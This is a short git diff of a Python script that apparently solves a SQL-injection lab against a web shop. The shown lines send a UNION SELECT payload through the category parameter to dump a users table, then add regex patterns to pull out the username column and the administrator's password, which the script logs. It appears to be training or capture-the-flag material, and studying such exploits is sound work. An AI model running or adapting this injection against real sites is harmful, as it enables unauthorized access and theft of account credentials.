@@ -53,6 +53,7 @@ def main(args):
     password_column = m[1]
     #username
     pattern = re.compile(r"<th>(username_.*?)</th>")
+    m = pattern.search(resp.text)
     username_column = m[1]
     log.info(f"Got username and pw columns: {username_column}, {password_column}")
     log.info("Getting usernames and pw from db")
@@ -61,6 +62,7 @@ def main(args):
     nulls[text_columns[1]] = password_column
     nulls = ",".join(nulls)
     resp = shop.get_category(f"' UNION SELECT {nulls} from {users_table}-- ")
+    pattern = r"<th>administrator</th>.*?<td>(.*?)</td>"
     m = re.search(pattern, resp.text, flags=re.M | re.DOTALL)
     password = m[1]
     log.info(f"Got admin's pw: {password}")
